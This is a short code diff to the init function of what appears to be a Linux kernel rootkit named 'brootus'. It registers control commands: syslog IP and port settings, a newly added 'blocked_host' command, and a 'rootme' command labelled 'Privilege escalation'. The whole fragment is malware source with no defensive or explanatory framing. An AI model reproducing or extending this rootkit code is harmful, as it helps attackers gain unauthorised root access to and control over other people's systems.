@@ -69,6 +69,10 @@ int __init init(void)
 	add_command("syslog_ip", set_syslog_ip);
 	add_command("syslog_port", cmd_set_syslog_port);
 
+	// Configure blocked host
+	add_command("blocked_host", set_blocked_host_ip);
+
+	// Privilege escalation
 	add_command("rootme", cmd_root_me);
 
 	// Initialize the brootus modules
